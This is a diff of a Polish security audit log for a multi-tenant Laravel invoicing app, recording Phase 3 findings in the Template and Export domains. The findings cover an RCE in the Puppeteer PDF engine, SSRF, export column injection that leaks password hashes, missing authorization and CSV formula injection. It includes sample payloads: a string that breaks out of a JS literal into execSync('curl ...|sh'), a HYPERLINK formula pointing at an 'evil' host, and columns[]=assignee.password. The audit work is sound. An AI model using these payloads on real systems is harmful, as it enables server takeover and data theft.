@@ -89,13 +89,13 @@ Wszystko z listy domenowej +
 ### Faza 3 — Systemy wspierające
 
 - [x] Approval (workflow engine)
-- [ ] Template (szablony faktur, PDF)
+- [x] Template (szablony faktur, PDF)
 - [x] ShareToken
 - [x] Feeds
 - [x] Chat
 - [x] Calendar
 - [x] Skills
-- [ ] Export
+- [x] Export
 - [x] Admin
 - [x] Users
 
@@ -133,13 +133,37 @@ Wszystko z listy domenowej +
 | 0 — Fundamenty | **Ukończona — WYMAGA PILNEJ NAPRAWY** | 2026-07-02 | 6 critical, 6 high, ~10 medium/low. Wzorzec: autoryzacja nieegzekwowana w kilku miejscach; jeden przeciek tenant-log; multi-tenancy rdzeń OK poza bypassTenant |
 | 1 — Integracje | **Ukończona + naprawiona Grupa A** | 2026-07-02 | 14 critical, ~20 high w 9 integracjach. 6/14 critical naprawionych (aktywnie eksploatowalne: Stripe, tenant isolation, plaintext credentials, SSRF, fałszywy status weryfikacji). KSeF/e-Doręczenia (Grupa B, martwy kod) odłożone świadomie. Reszta HIGH/MEDIUM/LOW nienaprawiona |
 | 2 — Core biznesowy | **Ukończona + naprawiona Grupa A** | 2026-07-02 | 14 critical, ~15 high w 6 domenach. 13/14 critical naprawionych (aktywnie eksploatowalne: IDOR branding/profil/logo tenanta, brak autoryzacji Invoice/Contractors/Products/OrganizationUnit/PositionCategory, brak unikalności numeru faktury, brak walidacji sum finansowych, kasowanie faktury zamiast tokenu, `tenant_id = NULL` na adresach/kontach bankowych). Projects (funkcjonalnie martwe) i Expense allocation/approval (403 dla wszystkich) odłożone jako known-issue Grupa B |
-| 3 — Wspierające | Nierozpoczęta | — | — |
+| 3 — Wspierające | **Ukończona (audyt)** | 2026-07-02 | 10 domen, ~9 critical + ~20 high. Najgorsze: RCE w silniku PDF Puppeteer (dowolny user z uprawnieniem do szablonów), publiczny endpoint usera bez autoryzacji (wyciek email/telefonu/daty urodzenia wszystkich userów), eksport omija `$hidden`/relacje (wyciek zahaszowanego hasła), cross-tenant DM w Chat, cross-tenant leak w Approval, zepsuta funkcja udostępniania faktur (ShareToken). Fixy Grupa A jeszcze nie zrobione |
 | 4 — Frontend | Nierozpoczęta | — | — |
 | 5 — Synteza | Nierozpoczęta | — | — |
 
 ## Findings
 
 *(uzupełniane w trakcie — każda faza dopisuje sekcję z listą problemów, posortowaną wg wagi)*
+
+### Faza 3 — Template, Export
+
+**Wzorzec:** to najpoważniejsza para findingów w całym przeglądzie do tej pory — silnik PDF (Puppeteer, domyślny w tej aplikacji) buduje skrypt Node.js przez surową interpolację stringów z pola JSON kontrolowanego przez zwykłego tenant-usera i wykonuje go przez `exec()`, co daje **realne zdalne wykonanie kodu**. Domena Export ma równoległy, osobny problem tej samej klasy co IDOR: lista eksportowanych kolumn jest w 100% sterowana przez klienta, bez whitelisty, co pozwala ominąć `$hidden` na modelach (np. wyciągnąć zahashowane hasło przypisanego usera przez `columns[]=assignee.password`) — a 3 z 5 endpointów eksportu (Invoice/Task/Expense) w ogóle nie mają autoryzacji, mimo że analogiczne (Contractors/Products) dostały ją w Fazie 2.
+
+**Template:**
+
+- **[CRITICAL — RCE]** `PuppeteerEngine::generatePuppeteerScript()` buduje plik `.js` przez surową interpolację stringów (np. `format: '{$settings['format']}'`) bez żadnego escapowania, po czym uruchamia go przez `exec("timeout ... node script.js")`. Wartość `settings` pochodzi wprost z `InvoiceTemplate.settings` (pole JSON walidowane tylko jako `['nullable','array']` — brak schematu pól) i trafia tam bez sanityzacji. **Każdy user z uprawnieniem `invoice_templates.manage` (role Admin/Owner/Manager/FinancialManager) może ustawić `settings.format` na string zrywający literał JS (np. zawierający `'); require('child_process').execSync('curl ...|sh'); //`) i wykonać dowolny kod na serwerze przy pobraniu PDF faktury.** Puppeteer jest domyślnym silnikiem PDF w tej aplikacji (`config/pdf.php: PDF_ENGINE=puppeteer`), nie opcjonalną ścieżką — to nie jest brzegowy przypadek.
+- **[HIGH — SSRF]** `config/pdf.php` (`chrome_flags`) NIE zawiera `--disable-javascript` (w przeciwieństwie do wewnętrznego fallbacku w kodzie) i ZAWIERA `--disable-web-security` (CORS wyłączony). Treść szablonu (`InvoiceTemplate.content`) to w pełni kontrolowany przez tenant-usera surowy HTML/Handlebars — `<script>` w treści szablonu wykonuje się w serwerowej headless-przeglądarce z JS włączonym i CORS wyłączonym, co pozwala na SSRF do usług wewnętrznych/metadata endpointów z możliwością odczytu odpowiedzi i eksfiltracji przez kolejny `fetch`.
+- **[MEDIUM]** `InvoiceTemplateService::create()/update()` waliduje składnię Handlebars przed zapisem, ale to martwy kod — `InvoiceTemplateController::store()/update()` wywołuje bezpośrednio `InvoiceTemplate::create()`/`->update()` na modelu, całkowicie pomijając serwis. Błędny szablon da się zapisać bez ostrzeżenia, wybuchnie dopiero przy generowaniu PDF.
+- **[MEDIUM]** Globalne szablony systemowe (`tenant_id = null`, fallback dla wszystkich tenantów bez własnego domyślnego) mogą być edytowane/usuwane/przełączane jako domyślne przez DOWOLNEGO tenant-usera z `invoice_templates.manage`, nie tylko super-admina — `InvoiceTemplatePolicy` uznaje `tenant_id === null` za zawsze autoryzowane. Jeden zły/przejęty Manager w jednej firmie może zepsuć domyślny szablon używany przez wszystkie inne tenanty.
+- **[LOW]** `InvoiceTemplateController::update()` odwołuje się bezwarunkowo do `$data['category']` mimo że pole jest `sometimes` — PATCH bez `category` daje "Undefined array key". Porównanie enum vs string przy detekcji zmiany kategorii jest zawsze `true` (martwa logika).
+- **[LOW]** `InvoiceTemplatePolicy` jako jedyna polisa w projekcie NIE jest zarejestrowana w `AuthServiceProvider::$policies` — dziś działa dzięki Laravel auto-discovery, ale kruche (cicha zmiana na deny-all przy przeniesieniu klasy, bez błędu) i niespójne z resztą kodu, gdzie 10 innych polis jest rejestrowanych explicite.
+- **[LOW]** Zero testów dla całej domeny Template.
+
+**Export:**
+
+- **[CRITICAL]** Dowolne ujawnianie kolumn/relacji przez parametr `columns` z requestu — `BaseExport::__construct()` pozwala klientowi całkowicie nadpisać bezpieczną domyślną whitelistę. `BaseExport::map()` używa `data_get($row, $col)`, co przez magiczny `__get` Eloquenta **omija `$hidden`** (egzekwowane tylko w `toArray()/toJson()`) i doładowuje dowolne relacje niezależnie od `allowedIncludes()`. **Przykład: `columns[]=assignee.password` na `/tasks/export` zwraca zahashowane hasło przypisanego usera.** Dotyczy wszystkich 5 klas eksportu.
+- **[CRITICAL]** Brak autoryzacji na 3 z 5 endpointów eksportu: `InvoiceController::export()`, `TaskController::export()`, `ExpenseController::export()` nie mają żadnego `$this->authorize()`/sprawdzenia roli — dowolny zalogowany user (nawet rola `User` z zerowymi uprawnieniami) może zrzucić masowo wszystkie faktury/zadania/wydatki. Dla kontrastu `ContractorController::export()`/`ProductController::export()` poprawnie mają `authorizeManage()` (Owner/Admin) — naprawione w Fazie 2, ale ten sam fix nie objął Invoice/Task/Expense.
+- **[HIGH]** CSV/Excel Formula Injection (CWE-1236) — `BaseExport::map()` zwraca surowe wartości pól bez sanityzacji wiodących `=`/`+`/`-`/`@`. String typu `=HYPERLINK("http://evil/","x")` wpisany w dowolne pole tekstowe (nazwa kontrahenta, tytuł zadania...) trafia do `.xlsx` jako żywa formuła, wykonująca się przy otwarciu w Excelu przez pracownika. Żadna z 5 klas eksportu tego nie neutralizuje.
+- **[MEDIUM]** `ExpensesExport`/`InvoicesExport` nie definiują domyślnego `$columns` (dziedziczą puste), w przeciwieństwie do `ContractorsExport`/`ProductsExport` — bez jawnego `columns` w requeście te dwa eksporty dają pusty plik, a jedynym sposobem uzyskania danych jest ręczne podanie surowych ścieżek kolumn/relacji, czyli dokładnie to, co umożliwia finding #1.
+- **[MEDIUM]** Potwierdzenie znanego z Fazy 2 findingu: `ExpensesExport::baseQuery()` nadal nie filtruje `approval_status` — wydatki draft/rejected/pending nadal trafiają do eksportu razem z zatwierdzonymi, brak fixu na poziomie domeny Export.
+- **[LOW]** Brak limitu wierszy i brak kolejkowania — żadna z 5 klas eksportu nie implementuje `WithChunkReading`/`ShouldQueue`, `ExportService::download()` działa synchronicznie w ramach requestu — potencjalny DoS/timeout dla dużego tenanta.
+- **[LOW]** Zero testów dla całej domeny Export.
 
 ### Faza 3 — Approval, Users
 
